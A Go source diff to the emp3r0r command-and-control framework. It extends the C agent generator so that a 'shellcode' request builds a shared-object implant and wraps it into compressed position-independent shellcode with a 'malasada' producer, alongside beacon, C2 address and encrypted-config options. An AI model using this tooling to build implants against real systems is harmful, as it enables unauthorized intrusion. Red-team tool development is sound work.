@@ -7,6 +7,8 @@ import (
 	"github.com/carapace-sh/carapace"
 	"github.com/jm33-m0/emp3r0r/core/internal/cc/api/client"
 	"github.com/jm33-m0/emp3r0r/core/internal/cc/builder"
+	"github.com/jm33-m0/emp3r0r/core/internal/cc/detection"
+	"github.com/jm33-m0/emp3r0r/core/internal/cc/modules"
 	"github.com/jm33-m0/emp3r0r/core/internal/def"
 	"github.com/jm33-m0/emp3r0r/core/internal/live"
 	"github.com/jm33-m0/emp3r0r/core/lib/logging"
@@ -132,6 +134,7 @@ func CmdGenerateCAgent(cmd *cobra.Command, _ []string) {
 		logging.Errorf("Invalid beacon timing: %v", err)
 		return
 	}
+	requestedShellcode := flagString(cmd, "format") == "shellcode"
 	providers := builder.CAgentProviders{
 		Crypto:               flagString(cmd, "crypto"),
 		Gzip:                 flagString(cmd, "gzip"),
@@ -144,6 +147,9 @@ func CmdGenerateCAgent(cmd *cobra.Command, _ []string) {
 		Bof:                  builder.BoolProvider(flagBool(cmd, "bof")),
 		Rvvm:                 builder.BoolProvider(flagBool(cmd, "rvvm")),
 		AllowCustomTransport: allowCustom,
+	}
+	if providers.Format == "shellcode" {
+		providers.Format = "so"
 	}
 	opts := builder.AgentConfig{
 		CCAddress:            getStringOptPtr(cmd, "cc"),
@@ -158,7 +164,7 @@ func CmdGenerateCAgent(cmd *cobra.Command, _ []string) {
 		Jitter:               &jitter,
 		// shellcode is the artifact stager_linux embeds for a local payload.
 		// Mark it so the agent binds the stager mask and identity FDs.
-		IsStager: builder.CAgentStagerMode(providers.Format),
+		IsStager: requestedShellcode,
 	}
 
 	logging.Infof("Generating C agent in the background; output follows")
@@ -172,7 +178,19 @@ func CmdGenerateCAgent(cmd *cobra.Command, _ []string) {
 			return
 		}
 
-		logging.Successf("Generated C agent: %s (%d bytes)", res.OutputFile, util.FileSize(res.OutputFile))
+		if requestedShellcode {
+			logging.Successf("Generated C agent shared object: %s (%d bytes)", res.OutputFile, util.FileSize(res.OutputFile))
+		} else {
+			logging.Successf("Generated C agent: %s (%d bytes)", res.OutputFile, util.FileSize(res.OutputFile))
+		}
+		if requestedShellcode {
+			pic, wrapErr := wrapCAgentWithMalasada(res.OutputFile)
+			if wrapErr != nil {
+				logging.Errorf("Malasada producer: %v", wrapErr)
+			} else {
+				logging.Successf("Generated malasada PIC: %s (%d bytes)", pic, util.FileSize(pic))
+			}
+		}
 		logging.Infof("C agent UUID: %s", util.AgentRef(res.AgentUUID))
 		logging.Infof("Config payload: %d bytes, encrypted with the C2 MagicString", res.ConfigSize)
 		endpoint := builder.CAgentEndpoint(live.RuntimeConfig.CCAddress, live.RuntimeConfig.CCHTTPPort, channelMode)
@@ -192,4 +210,26 @@ func flagString(cmd *cobra.Command, name string) string {
 func flagBool(cmd *cobra.Command, name string) bool {
 	v, _ := cmd.Flags().GetBool(name)
 	return v
+}
+
+// wrapCAgentWithMalasada runs the installed malasada producer on a C agent
+// shared object. The builder owns the agent; the producer owns the PIC wrapper.
+func wrapCAgentWithMalasada(soPath string) (string, error) {
+	dirs := detection.DefaultLinuxProducerDirs()
+	dir := strings.TrimSpace(dirs["malasada"])
+	if dir == "" {
+		return "", fmt.Errorf("the malasada producer is not installed")
+	}
+	output := strings.TrimSuffix(soPath, ".so") + ".bin"
+	buildLog, err := modules.BuildLocalModuleAt(dir, "malasada", map[string]string{
+		"input": soPath, "output": output, "call-export": "main", "compress": "on",
+	})
+	if err != nil {
+		return "", fmt.Errorf("malasada build: %w\n%s", err, lastLogLines(buildLog, 20))
+	}
+	payloads := detection.ParseGeneratedPayloads(buildLog)
+	if len(payloads) == 0 {
+		return "", fmt.Errorf("malasada did not report a generated payload")
+	}
+	return payloads[len(payloads)-1].Path, nil
 }
